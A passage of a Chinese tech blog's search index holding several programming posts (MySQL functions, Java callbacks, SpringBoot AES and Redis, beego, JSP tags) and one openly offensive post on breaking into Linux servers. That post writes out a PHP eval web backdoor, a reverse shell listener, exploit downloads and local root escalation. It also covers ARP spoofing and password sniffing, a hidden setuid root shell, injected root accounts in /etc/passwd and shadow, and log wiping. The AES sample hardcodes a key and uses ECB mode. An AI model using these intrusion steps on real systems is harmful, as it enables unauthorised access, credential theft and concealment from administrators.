function(end) &#123; // stream end signal&#125;);]]></content>
      <categories>
        <category>go,gRPC</category>
      </categories>
      <tags>
        <tag>gRPC</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql中的SQL函数]]></title>
    <url>%2F2019%2F03%2F30%2FMysql%E4%B8%AD%E7%9A%84SQL%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[算术函数 ABS ：取绝对值 MOD：取余 ROUND：四舍五入时指定小数点位数 12345SELECT ABS(-1); # 结果为 1SELECT MOD(22,5); # 22%5 结果为 2SELECT ROUND(15.43,1); # 结果为 15.4 字符串函数 CONCAT： 将多个字符串连接起来 LENGTH： 计算字段的长度，一个汉字算三个字符，字母和数字算一个字符 CHAR_LENGTH：所有都算做一个字符 LOWER：全部转为小写 UPPER：全部转为大写 REPLACE：替换字符 SUBSTRING：截取字符串（字符串, 开始截取位置, 截取长度）1234567SELECT CONCAT("%","pibigstar"); # 结果为 %pibigstarSELECT LENGTH("你好"); # 结果为 6SELECT CHAR_LENGTH("你好"); # 结果为 2SELECT LOWER("AB"); # 结果为 abSELECT UPPER("ab") # 结果为 ABSELECT REPLACE("abc","a", "f"); # 结果为 fbcSELECT SUBSTRING("abc", 1, 2); # 结果为 ab 日期函数 CURRENT_DATE：系统当前日期 CURRENT_TIME：系统当前时间 CURRENT_TIMESTAMP：系统当前时间（日期+时间） ECTRACT：抽取具体的年、月、日 DATE：返回时间的日期部分 YEAR：返回时间的年份部分 MONTH：返回时间的月份部分 DAY：返回时间的天数部分 HOUR：返回时间的小时部分 MINUTE：返回时间的分钟部分 SECOND： 返回时间的秒部分123456SELECT CURRENT_DATE(); # 2019-06-29SELECT CURRENT_TIME(); # 21:44:33SELECT CURRENT_TIMESTAMP(); # 2019-06-29 21:44:33SELECT EXTRACT(YEAR FROM '2019-06-29'); # 2019SELECT DATE('2019-06-29 21:44:33'); # 2019-06-29SELECT DAY('2019-06-29 21:44:33'); # 29 转换函数 CAST：强制数据类型转换 COALESCE：返回第一个非空数值12SELECT CAST(65.243 AS DECIMAL(8,2)); # 65.24SELECT COALESCE(null,null,2,3); # 2 聚合函数 SUM：求和 AVG：求平均值 MAX：找出最大值 MIN：找出最小值 COUNT：计数1234567SELECT SUM(age) FROM user;SELECT AVG(age) FROM user;SELECT MAX(age) FROM user;SELECT MIN(age) FROM user;SELECT COUNT(*) FROM user; # 计录全部行数，包括nullSELECT COUNT(age) FROM user; # 如果age为null，将过滤SELECT COUNT(*) FROM user GROUP BY age; 在SELECT的查询中，关键字的顺序不能颠倒，它们的顺序为： 1SELECT...FROM...WHERE...GROUP BY...HAVING...ORDER BY...LIMIT...]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Callable实现不同回调函数]]></title>
    <url>%2F2019%2F03%2F26%2F%E4%BD%BF%E7%94%A8Callable%E5%AE%9E%E7%8E%B0%E4%B8%8D%E5%90%8C%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[针对不同的场景，我们可能需要不同的回调，每一个回调操作是不同的 定义回调操作抽象类1234567891011121314151617181920212223242526272829public abstract abstract class Operation&lt;V&gt; implements Callable&lt;V&gt; &#123; /** 内部具体的执行操作 */ protected abstract V run() throws HttpRequestException, IOException; /** 执行完成后的回调 **/ protected abstract void done() throws IOException; /** 内部进行一列的异常捕获，确保 run 函数 和 done函数 正常执行 **/ public V call() throws HttpRequestException &#123; boolean thrown = false; try &#123; return run(); &#125; catch (HttpRequestException e) &#123; thrown = true; throw e; &#125; catch (IOException e) &#123; thrown = true; throw new HttpRequestException(e); &#125; finally &#123; try &#123; done(); &#125; catch (IOException e) &#123; if (!thrown) &#123; throw new HttpRequestException(e); &#125; &#125; &#125; &#125; &#125; 我们定义一个 call函数，内部调用 run 和 done函数，这样我们可以针对不同的回调，我们可以继承此抽象类，实现不同 的 done 函数，来达到实现不同的回调操作,run 函数是调用者要实现的 实现一个自由控制的关闭回调我们通过ignoreCloseExceptions 参数，来控制是否当 done 发生异常时，程序是忽略还是终止 1234567891011121314151617181920212223242526public abstract class CloseOperation&lt;V&gt; extends Operation&lt;V&gt; &#123; private final Closeable closeable; private final boolean ignoreCloseExceptions; protected CloseOperation(final Closeable closeable, final boolean ignoreCloseExceptions) &#123; this.closeable = closeable; this.ignoreCloseExceptions = ignoreCloseExceptions; &#125; @Override protected void done() throws IOException &#123; if (closeable instanceof Flushable) &#123; ((Flushable) closeable).flush(); &#125; if (ignoreCloseExceptions) &#123; try &#123; closeable.close(); &#125; catch (IOException e) &#123; // Ignored，如果发生异常了，程序继续执行，会忽略掉此异常 &#125; &#125; else &#123; // 如果发生异常了，此时程序会退出 closeable.close(); &#125; &#125; &#125; 实现一个流刷新操作，确保流正常刷新到底层12345678910111213public abstract class FlushOperation&lt;V&gt; extends Operation&lt;V&gt; &#123; private final Flushable flushable; protected FlushOperation(final Flushable flushable) &#123; this.flushable = flushable; &#125; @Override protected void done() throws IOException &#123; flushable.flush(); &#125; &#125; 使用1234567891011121314new CloseOperation&lt;HttpRequest&gt;(reader, ignoreCloseExceptions) &#123; @Override public HttpRequest run() throws IOException &#123; return copy(reader, writer); &#125;&#125;.call();new FlushOperation&lt;HttpRequest&gt;(writer) &#123; @Override protected HttpRequest run() throws IOException &#123; return copy(input, writer); &#125;&#125;.call();]]></content>
      <categories>
        <category>Java,架构</category>
      </categories>
      <tags>
        <tag>callable</tag>
        <tag>回调</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[入侵Linux服务器常用命令]]></title>
    <url>%2F2019%2F03%2F25%2F%E5%85%A5%E4%BE%B5Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[写个php一句话后门上去：12$ echo -e "&lt;?php @eval($_POST[md5])?&gt;" &gt;rankuplog_time.php​$ cat rankuplog_time.php 1.linux的想着先跨站。 shell浏览目标站不行，命令行下输入 1ls -la /www.users/ 2.溢出提权 1# python –c ‘impotr pty;pty.spawn(“/bin/sh”); 来得到交互的Shell,一般的系统都默认安装python 输入id 123bash-3.2$ iduid=529(zeicom) gid=525(zeicom) groups=525(zeicom)bash-3.2$ 这里uid=529(zeicom)还不是root权限， 输入uname –r返回：2.6.18-164.11.1.el5PAE 2. Linux提权大致可分为 第三方软件漏洞 本地信任特性 内核溢出 找对应的exp这里地址整理很齐全可以这里下 http://tools.90sec.org/ http://sebug.net/paper/linux_exp/ http://x73.cc/bitch/exp/ http://www.exploit-db.com/search/ 命令输入pwd,这个命令是显示当前目录， 先看能不能编译 gcc -help 当前目录就是shell的目录，我在shell上传2.c 反弹shell 到外网自己机器的12345端口 上外网服务器 本地监听 nc -lvvp 12345 一般都能得到一个apache交互的shell 有时候又不行 这时候 1# python -c impotr pty;pty.spawn("/bin/sh"); 然后 12345678# 进入tmp目录 cd /tmp# 创建一个Papers的目录 Papers不显眼 mkdir Papers # 进入 Papers目录cd Papers # 查看当前目录 pwd 然后命令输入 1wget 下载exp的URL 把2.c编译成可执行文件 g++ keio.cc -o keio 1gcc –o 2 2.c 给2有执行权限 1chmod +x 2 执行2, 溢出 1./2 执行 1gcc -I/usr/local/include -L/usr/local/lib -o arpsniffer arpsniffer.c -lpcap -lnet 确定arpsniffer.c需要先装pcap和 libnet。 12345678910111213rpm -ivh libnet-1.1.2.1-2.1.fc2.rf.i386.rpm# 下载wget http://downloads.sourceforge.net/libpcap/libpcap-0.8.1.tar.gz?modtime=1072656000&amp;big_mirror=0# 解压tar zxvf libpcap-0.8.1.tar.gz# 进入目录cd libpcap-0.8.1# 执行./configure# 编译make# 安装make install 重新编译arpsniffer.c再次执行 1gcc -I/usr/local/include -L/usr/local/lib -o arpsniffer arpsniffer.c -lpcap -lnet 这次没报错，编译成功。运行 1./arpsniffer -I eth0 -M 192.168.0.6 -W 192.168.0.4 -S 192.168.0.254 3. 下面开始欺骗由于是服务器端，因此我们欺骗网关：（网络环境如下，邮件服务器ip：192.168.0.11 网关：192.168.0.1 本机：192.168.0.77）执行 1./arpsniffer -I eth0 -M 192.168.0.77 -W 192.168.0.1 -S 192.168.0.11 -P 110 在另一个登录里面用tcpdump监听下 1tcpdump -i eth0 host 192.168.0.11 发现有数据，把监听的数据存在文件里面： 1tcpdump -i eth0 host 172.16.0.12 -w pop.txt 10分钟后停止，在SecureCRT下用sz命令下载pop.txt到本地，然后用Ethereal分析。 下面我们就可以用linsniffer监听我们想要的用户名和密码了。 先修改linsniffer.c：根据自己的需求监听相应的应用密码。我的如下： 12345678910111213if(ntohs(tcp-&gt;dest)==21) p=1; /* ftp */if(ntohs(tcp-&gt;dest)==22) p=1; /* ssh for comparison added for example only comment out if desired*/if(ntohs(tcp-&gt;dest)==23) p=1; /* telnet */if(ntohs(tcp-&gt;dest)==80) p=1; /* http */if(ntohs(tcp-&gt;dest)==110) p=1; /* pop3 */if(ntohs(tcp-&gt;dest)==513) p=1; /* rlogin */if(ntohs(tcp-&gt;dest)==106) p=1; /* poppasswd */ 编译执行 1[root@pibigstar root]# gcc -o linsniffer linsniffer.c 会提示下面 In file included from /usr/include/linux/tcp.h:21,from linsniffer.c:32:/usr/include/asm/byteorder.h:6:2: warning: #warning using private kernel header; include &lt;endian.h&gt; instead! 不用管警告，直接运行编译后的linsniffer即可。 1[root@pibigstar root]# ./linsniffer 用户名和密码都自动存到了tcp.log下。 4.利用跨站代码linux不提权跨目录访问的代码 linux权限多设的比较松的其实，但有的虚拟机还是不能跨目录访问的。 在提不了权的情况下，试试如下代码吧。运气好的话说不定就跨过去了。 代码如下： 123456789$path = stripslashes($_GET[ path ]);$ok = chmod ($path , 0777);if ($ok == true)echo CHMOD OK , Permission editable file or directory. Permission to write;?&gt; 把上面代码保存为tmdsb.PHP 然后访问http://www.tmdsb.com/tmdsb.php?path=../../要跨的目录/index.php 这里的index.PHP是要修改权限的文件。 收集的另一个exp： 把下面的代码保存为exp.PHP 代码： 12345678910111213@$filename = stripslashes($_POST[ filename ]);@$mess = stripslashes($_POST[ mess ]);$fp = @fopen(&#123;$_POST[ filename ]&#125;, a );@fputs($fp,$mess );@fclose($fp);?&gt; 最终Linux Kernel &lt; 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)这个0day溢出成功 5. udev提权换了个udev提权，适用于内核范围为2.6.*。 还是上传文件至服务器shell所在目录，执行命令ls，发现文件已经躺在那里面了，之后赋予exp执行权限。 12345chmod +x pwnkernel.cchmod +x wunderbar_emporium.shchmod +x exploit.c 之后执行./w*溢出 成功溢出，root权限。 之后就是留下一个后门~ 添加一个root权限用户俺也不介意。。。 1useradd -u 0 -o "username" 依次输入命令 1234567891011cd /tmpls /lib/ld-linux*cp /lib/ld-linux.so.2 /tmp/.str1venls -l .str1venchmod +s .str1venls -l .str1ven -rwsr-sr-x 1 root root 121684 07-08 21:13 .str1ven 成功建立一个后门，退出root，执行 1./.str1ven `which whoami` 又成功获取root权限~~ 123456789101112# 查看linux用户cat /etc/passwd # 查看用户密码需要root权限cat /etc/shadow # N代表网卡号 查看所在网卡的ip信息cat /etc/sysconfig/network-scripts/ifcfg-ethn # 查看本机ip信息ifconfig # 查看DNS信息cat /etc/resolv.conf 在反弹的shell中使用可以直观显示命令bash -i bash prompt:当你以普通限权用户身份进入的时候，一般你会有一个类似bash$的prompt。当你以Root登陆时，你的prompt会变成bash#。 系统变量:试着echo &quot;$USER / $EUID&quot;系统应该会告诉你它认为你是什么用户。 123456789101112131415echo 1&gt;/proc/sys/net/ipv4/if_forward,1&gt;/proc/sys/net/ipv4/ip_forward# 修改,默认是0,也就是内核不进行数据包过滤,改为1 ,让内核对数据包进行filter处理!vim /proc/sys/net/ipv4/ip_forward # 查看80端口的进程netstat -an |grep LISTEN |grep :80 查看端口# 服务正在运行的进程service --status-all | grep running# 服务为http的进程service --status-all | grep http# 查看系统版本lsb_release -a # 重启ssh服务 ：/usr/sbin/sshd stop/usr/sbin/sshd start ssd_config文件里 PasswordAuthentication no 将其改为 PasswordAuthentication yes 远程ssh才可登录 否则显示Access denied 其中Usepam yes可能用来建立pam方式login，比如从其它linux主机ssh到服务端，如果关闭，则不能打开. su的菜鸟用法先 1chomod 777 /etc/passwd 然后修改bin用户的gid和uid为0 然后passwd设置bin的密码 然后 1cp /bin/bash /sbin/nologin 然后su的时候 1su - bin 就可以到rootshell了。 这个原理就是当ssh不允许root用ssh终端登陆的时候，我们又不知道root密码的一种很菜鸟的做法。 还可以这样 12345678910sed -i s/bin:x:1:1/bin:x:0:1/g /etc/passwdgcc prtcl2.c –o local –static –Wallecho "nosec:x:0:0::/:/bin/sh" &gt;&gt; /etc/passwdecho "nosec::-1:-1:-1:-1:-1:-1:500" &gt;&gt; /etc/shadow# 清空last记录 cp /dev/null /var/log/wtmp 建立一个100m的大文件在利用Linux Kernel &lt;= 2.6.17.4 (proc) Local Root Exploit提权的时候要用到的 123456dd if=/dev/zero of=yourfile bs=10M count=10 # 开22端口/etc/init.d/ssh start # SSH服务配置文件/etc/ssh/sshd_config]]></content>
      <categories>
        <category>Linux,渗透</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>入侵</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go代码风格检查脚本]]></title>
    <url>%2F2019%2F03%2F24%2FGo%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[Go代码风格检查脚本check.sh 12345678910111213#!/bin/bashcd "$&#123;GOPATH&#125;/src/github.com/pibigstar/go-demo"# 判断是否有环形导入gocyclo -over 25 $(ls -d */ | grep -v vendor | grep -v proto)# 查找是否有错误find . -type f -not -path "./vendor/*" | xargs -0 misspell -error# 对所有代码进行格式化find . -name "*.go" -not -path "./vendor/*" | xargs gofmt -w# 对所有代码进行导入格式化find . -name "*.go" -not -path "./vendor/*" | xargs goimports -w# 判断前后两次是否有差别，如果有则退出git diff --exit-code]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>gofmt</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot前后端数据传输加密]]></title>
    <url>%2F2019%2F03%2F24%2FSpringBoot%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[采用的算法为AES算法 1. 编写加密工具类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.pibigstar.utils;import javax.crypto.Cipher;import javax.crypto.KeyGenerator;import javax.crypto.spec.SecretKeySpec;import org.apache.commons.codec.binary.Base64;/** * 前后端数据传输加密工具类 * @author pibigstar * */public class AesEncryptUtils &#123; //可配置到Constant中，并读取配置文件注入 private static final String KEY = "abcdef0123456789"; //参数分别代表 算法名称/加密模式/数据填充方式 private static final String ALGORITHMSTR = "AES/ECB/PKCS5Padding"; /** * 加密 * @param content 加密的字符串 * @param encryptKey key值 * @return * @throws Exception */ public static String encrypt(String content, String encryptKey) throws Exception &#123; KeyGenerator kgen = KeyGenerator.getInstance("AES"); kgen.init(128); Cipher cipher = Cipher.getInstance(ALGORITHMSTR); cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(encryptKey.getBytes(), "AES")); byte[] b = cipher.doFinal(content.getBytes("utf-8")); return Base64.encodeBase64String(b); &#125; /** * 解密 * @param encryptStr 解密的字符串 * @param decryptKey 解密的key值 * @return * @throws Exception */ public static String decrypt(String encryptStr, String decryptKey) throws Exception &#123; KeyGenerator kgen = KeyGenerator.getInstance("AES"); kgen.init(128); Cipher cipher = Cipher.getInstance(ALGORITHMSTR); cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(decryptKey.getBytes(), "AES")); byte[] encryptBytes = Base64.decodeBase64(encryptStr); byte[] decryptBytes = cipher.doFinal(encryptBytes); return new String(decryptBytes); &#125; public static String encrypt(String content) throws Exception &#123; return encrypt(content, KEY); &#125; public static String decrypt(String encryptStr) throws Exception &#123; return decrypt(encryptStr, KEY); &#125; public static void main(String[] args) throws Exception &#123; String content = "派大星"; System.out.println("加密前：" + content); String encrypt = encrypt(content, KEY); System.out.println("加密后：" + encrypt); String decrypt = decrypt(encrypt, KEY); System.out.println("解密后：" + decrypt); &#125;&#125; 2. 前端js 文件下载：https://pan.baidu.com/s/11LnXUnsMtGW5C8sycf2SDQ 导入 js 文件 123&lt;script type="text/javascript" src = "js/aes.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src = "js/pad-zeropadding.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src = "js/security.js"&gt;&lt;/script&gt; 发送数据 123456789101112131415function sendData() &#123; alert("发送的数据："+Encrypt(JSON.stringify(&#123;name:"派大星"&#125;))); $.ajax(&#123; type: "POST", url:"/save", data:Encrypt(JSON.stringify(&#123;name:"派大星"&#125;)), dataType:'json', contentType: "application/json", success: function(resData) &#123; alert("返回的数据："+resData); alert("解密之后："+Decrypt(resData)); alert("解密之后转json对象："+JSON.parse(Decrypt(resData)).name); &#125; &#125;); &#125;]]></content>
      <categories>
        <category>Java,springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>数据加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言入门（3）beego的安装与使用]]></title>
    <url>%2F2019%2F03%2F21%2FGo%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%EF%BC%883%EF%BC%89beego%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1. 安装库可参考 ：https://beego.me/quickstart 1go get -u github.com/astaxie/beego 再安装bee 1go get -u github.com/beego/bee 2. 配置bee的环境变量在环境变量 path 中新加入 一个 %GOPATH%/bin 3. 测试在cmd 命令窗口中输入 ： bee 即可 4. 使用4.1 新建一个beego项目在cmd 命令行窗口中输入： 1bee new myfirst 4.2 运行先进入你生成的 项目中： 1cd myfirst 运行 1bee run 如果没报错，并且浏览器访问 http://127.0.0.1:8080 出现欢迎页面则证明一切OK]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>beego</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用redis]]></title>
    <url>%2F2019%2F03%2F21%2FSpringBoot%E4%BD%BF%E7%94%A8redis%2F</url>
    <content type="text"><![CDATA[[TOC] 1. 下载redis和工具 redis服务器下载： 点击这里 解压，双击start.bat启动服务 下载redis桌面管理程序：点击这里 安装即可 2. 加载redis的jar包在SpringBoot的pom.xml文件中加入下列内容 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-redis&lt;/artifactId&gt;&lt;/dependency&gt; 3. 添加配置文件在application.yml文件中加入下列内容 12345678910111213spring: redis: host: 127.0.0.1 port: 6379 database: 1 # 设置数据库索引为1 默认为0 password: # 密码为空 jedis: pool: max-active: 1000 # 连接池最大连接数（使用负值表示没有限制） max-wait: -1 # 连接池最大阻塞等待时间（使用负值表示没有限制） max-idle: 10 # 连接池中的最大空闲连接 min-idle: 2 # 连接池中的最小空闲连接 timeout: 5000 # 连接超时时间（毫秒） 4. 使用1234567891011121314151617@Autowiredprivate RedisService redisService; @GetMapping("test")public String test() &#123; User user = new User(); user.setId(1001); user.setName("pibigstar"); user.setPassword("123456"); //存数据 redisService.setObject("my:user",JSON.toJSONString(user)); //取数据 String json = redisService.getObject("my:user"); JSONObject parseObject = JSON.parseObject(json); User myUser = JSON.toJavaObject(parseObject, User.class); return myUser.toString();&#125; 使用的JSON工具为fastjson 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; 5. 在redis工具中查看数据 6. 封装工具类6.1 JSON工具类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.pibigstar.utils;import java.util.List;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONArray;import com.alibaba.fastjson.JSONObject;/** * JSON工具类 * @author pibigstar * */public class JSONUtil &#123; /** * java对象转换为JSON字符串 * @param object * @return */ public static String ObjectToJSON(Object object) &#123; return JSON.toJSONString(object); &#125; /** * JSON字符串转换为Java对象 * @param json * @param obj * @return */ public static &lt;T&gt; T jSONToObject(String json, Class&lt;T&gt; obj) &#123; JSONObject jsonObject = JSON.parseObject(json); return (T) JSON.toJavaObject(jsonObject, obj); &#125; /** * List集合转换为JSON字符串 * @param list * @return */ public static &lt;T&gt; String listToJSON(List&lt;T&gt; list) &#123; return JSONArray.toJSONString(list); &#125; /** * 将JSON字符串转换为List集合 * @param json * @param obj * @return */ public static &lt;T&gt; List&lt;T&gt; JSONToList(String json,Class&lt;T&gt; obj)&#123; return JSON.parseArray(json, obj); &#125;&#125; 6.2 redis操作工具类简单的封装一下。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.pibigstar.springboot.service;import java.util.concurrent.TimeUnit;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.core.StringRedisTemplate;import org.springframework.stereotype.Component;@Componentpublic class RedisService &#123; @Autowired private StringRedisTemplate stringRedisTemplate; @Autowired private RedisTemplate&lt;String, Object&gt; redisTemplate; /** * 存储String类型数据 * @param key * @param value */ public void set(String key,String value) &#123; stringRedisTemplate.opsForValue().set(key, value); &#125; /** * 存储String类型数据 * @param key * @param value * @param timeout 过期时间，单位：秒 */ public void set(String key,String value,long timeout) &#123; stringRedisTemplate.opsForValue().set(key, value,timeout,TimeUnit.SECONDS); &#125; /** * 得到String类型数据 * @param key * @return */ public String get(String key) &#123; return stringRedisTemplate.opsForValue().get(key); &#125; /** * 存储object对象 * @param key * @param value */ public void setObject(String key,Object value) &#123; redisTemplate.opsForValue().set(key, value); &#125; /** * 存储object对象 * @param key * @param value * @param timeout 过期时间，单位：秒 */ public void setObject(String key,Object value,long timeout) &#123; redisTemplate.opsForValue().set(key, value,timeout,TimeUnit.SECONDS); &#125; /** * 得到Object对象 * @param key * @return */ public Object getObject(String key) &#123; return redisTemplate.boundValueOps(key).get(); &#125;&#125;]]></content>
      <categories>
        <category>Java,springboot,redis,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>springboot</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSP自定义标签使用详解]]></title>
    <url>%2F2019%2F03%2F17%2FJSP%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[JSP自定义标签使用详解简单写一个可以从数据库中读取配置的单选按钮组件 1. Java部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146package com.pibgstar.demo.tags;import javax.servlet.jsp.JspException;import javax.servlet.jsp.JspWriter;import javax.servlet.jsp.tagext.SimpleTagSupport;import java.io.IOException;import java.util.ArrayList;/** * @author pibigstar * @create 2018-12-02 17:16 * @desc 自定义radio组件 **/public class RadioTagSupport extends SimpleTagSupport&#123; private String code; private String tip; private String key; private String value; private ArrayList&lt;RadioVo&gt; list; @Override public void doTag() throws JspException, IOException &#123; getData(); StringBuilder sp = new StringBuilder(); sp.append("&lt;div class='radio'&gt;"); sp.append("&lt;span class='tip'&gt;"); sp.append(this.getTip()); sp.append("&lt;/span&gt;"); for (RadioVo r: list) &#123; sp.append("&lt;input type='radio' "); sp.append("name='"); sp.append(r.getName()); sp.append("' value='"); sp.append(r.getValue()); if (r.getChecked()) &#123; sp.append("' checked /&gt;"); &#125;else &#123; sp.append("' /&gt;"); &#125; sp.append(r.getShowValue()); &#125; sp.append("&lt;/div&gt;"); JspWriter out = getJspContext().getOut(); out.write(sp.toString()); // 从body中获取值 //StringWriter sw = new StringWriter(); //getJspBody().invoke(sw); //getJspContext().getOut().write(sw.toString()); &#125; private void getData() &#123; list = new ArrayList(); // 这里可以通过code值，拿到数据库中自己配置的值，这里只是简单的封装几个固定的值 RadioVo r1 = new RadioVo(); r1.setName("sex"); r1.setValue("1"); r1.setShowValue("男"); RadioVo r2= new RadioVo(); r2.setName("sex"); r2.setValue("2"); r2.setShowValue("女"); &#125; public String getCode() &#123; return code; &#125; public void setCode(String code) &#123; this.code = code; &#125; public String getTip() &#123; return tip; &#125; public void setTip(String tip) &#123; this.tip = tip; &#125; public String getKey() &#123; return key; &#125; public void setKey(String key) &#123; this.key = key; &#125; public String getValue() &#123; return value; &#125; public void setValue(String value) &#123; this.value = value; &#125; public ArrayList&lt;RadioVo&gt; getList() &#123; return list; &#125; public void setList(ArrayList&lt;RadioVo&gt; list) &#123; this.list = list; &#125;&#125;class RadioVo &#123; private String name; private String value; private String showValue; private Boolean checked; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getValue() &#123; return value; &#125; public void setValue(String value) &#123; this.value = value; &#125; public String getShowValue() &#123; return showValue; &#125; public void setShowValue(String showValue) &#123; this.showValue = showValue; &#125; public Boolean getChecked() &#123; return checked; &#125; public void setChecked(Boolean checked) &#123; this.checked = checked; &#125;&#125; 2. tld编写12345678910111213141516171819202122232425262728&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;taglib xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-jsptaglibrary_2_1.xsd" version="2.1"&gt; &lt;description&gt;JSP 自定义标签&lt;/description&gt; &lt;display-name&gt;pibigstar core&lt;/display-name&gt; &lt;tlib-version&gt;1.0&lt;/tlib-version&gt; &lt;short-name&gt;pi&lt;/short-name&gt; &lt;tag&gt; &lt;description&gt;myself radio&lt;/description&gt; &lt;name&gt;radio&lt;/name&gt; &lt;tag-class&gt;com.pibgstar.demo.tags.RadioTagSupport&lt;/tag-class&gt; &lt;body-content&gt;JSP&lt;/body-content&gt; &lt;attribute&gt; &lt;name&gt;code&lt;/name&gt; &lt;required&gt;true&lt;/required&gt; &lt;rtexprvalue&gt;false&lt;/rtexprvalue&gt; &lt;/attribute&gt; &lt;attribute&gt; &lt;name&gt;tip&lt;/name&gt; &lt;required&gt;false&lt;/required&gt; &lt;rtexprvalue&gt;false&lt;/rtexprvalue&gt; &lt;/attribute&gt; &lt;/tag&gt;&lt;/taglib&gt; 3. JSP中使用12345678910&lt;%@taglib prefix="pi" uri="WEB-INFO/tlds/pibigstar-pi.tld" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;自定义radio标签使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pi:radio code="SEX" tip="性别"&gt;&lt;/pi:radio&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>jsp</category>
      </categories>
      <tags>
        <tag>jsp</tag>
        <tag>tag</tag>
        <tag>自定义标签</tag>
      </tags>
  </entry>
</search>
